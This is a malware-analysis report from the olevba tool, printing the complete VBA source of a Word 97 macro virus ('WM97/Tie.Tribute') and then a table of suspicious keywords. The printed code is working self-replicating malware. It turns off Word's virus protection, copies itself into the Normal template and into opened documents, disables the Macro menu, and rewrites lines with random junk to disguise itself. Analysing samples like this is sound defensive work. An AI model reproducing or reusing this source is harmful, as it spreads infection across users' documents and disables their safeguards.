olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.do-d5569eef271184aea393f1de31fcec88fd19d4b5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.do-d5569eef271184aea393f1de31fcec88fd19d4b5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Dim rsxg, roxg, xixg, xxig As Integer: Dim xxey, xexy, exxy, exdy, cxiy, cixy, xicy, eoxy, xoey, oxey, ciiy, rxey, rexy, exry, nixy, ixny, nxiy, lnry, nrly, rnly As String

Randomize

On Error GoTo bit

Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48)

rt = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

dt = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

If dt > 0 And rt > 0 Then GoTo bit

If dt = 0 Then

    Set Tri = NormalTemplate.VBProject.VBComponents

    Set rip = ActiveDocument.VBProject.VBComponents

    If Month(Now()) = 3 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(45) + Chr(82) + Chr(101) + Chr(115) + Chr(116) + Chr(32) + Chr(73) + Chr(110) + Chr(32) + Chr(80) + Chr(101) + Chr(97) + Chr(99) + Chr(101) + Chr(45)

    If Month(Now()) = 3 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(101) + Chr(44) + Chr(32) + Chr(116) + Chr(104) + Chr(101) + Chr(32) + Chr(107) + Chr(105) + Chr(116) + Chr(116) + Chr(121) + Chr(32) + Chr(67) + Chr(97) + Chr(116) + Chr(33)
  
    If Month(Now()) = 3 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(73) + Chr(32) + Chr(77) + Chr(73) + Chr(83) + Chr(83) + Chr(32) + Chr(89) + Chr(79) + Chr(85) + Chr(32) + Chr(58) + Chr(126) + Chr(40)

    rip.Item(Cos(Atn(CInt(1)))).Name = Tri.Item(Cos(Atn(CInt(1)))).Name

    rip.Item(Cos(Atn(CInt(1)))).Export Application.StartupPath & System.Version & Chr(46) + Chr(84) + Chr(105) + Chr(101)
    
End If

If rt = 0 Then Set Tri = ActiveDocument.VBProject.VBComponents

Tri.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Application.StartupPath & System.Version & Chr(46) + Chr(84) + Chr(105) + Chr(101)

With Tri.Item(Cos(Atn(CInt(1)))).codemodule

    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)

    Next j

    End With

If dt = 0 Then Tri.Item(Cos(Atn(CInt(1)))).codemodule.replaceline 1, "Sub AutoClose()"

If dt = 0 Then Tri.Item(Cos(Atn(CInt(1)))).codemodule.replaceline 83, "Sub ToolsMarco()"

If dt = 0 Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = False

If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Tri.Item(Cos(Atn(CInt(1)))).codemodule

   For j = Chr(50) To Tri.Item(Cos(Atn(CInt(1)))).codemodule.countoflines Step Chr(50)

    rsxg = Int(Rnd(11) * 4998) + 24: roxg = Int(Rnd(15) * 5863) + 33: xixg = Int(Rnd(44) * 3544) + 55: xxig = Int(Rnd(23) * 5745) + 44

    ciiy = Asc(rsxg): eoxy = Chr$(ciiy + 5): xoey = Chr$(ciiy - 14): oxey = Chr$(ciiy + 22): lnry = Chr$(ciiy - 4)

    cixy = Asc(roxg): rxey = Chr$(cixy + 7): rexy = Chr$(cixy - 16): exry = Chr$(cixy + 4): nrly = Chr$(cixy - 17)

    xicy = Asc(xixg): nixy = Chr$(xicy + 9): ixny = Chr$(xicy - 18): nxiy = Chr$(xicy + 8): rnly = Chr$(xicy - 33)
    
    cxiy = Asc(xxig): xxey = Chr$(cxiy + 4): xexy = Chr$(cxiy - 3): exxy = Chr$(cxiy + 18): exdy = Chr$(cxiy - 12)

    .replaceline j, Chr(39) & xxey & xexy & exxy & exdy & eoxy & rxey & nixy & xoey & rexy & ixny & oxey & exry & nixy & lnry & nrly & rnly & xxey & xexy & exxy & exdy & xoey & rexy & ixny & oxey & exry & nixy & rnly & xxey & xexy & exxy & exdy & xoey & eoxy & rxey & nixy & xoey & rexy & nixy & xoey & rexy & ixny & oxey & exry & nixy & lnry & nrly & rnly & xxey & xexy & exxy & exdy & xoey & rexy & ixny & oxey & exry & nixy & rnly & xxey

   Next j

End With

bit:

If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode() 'WM97/Tie.Tribute by Virus :~(

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
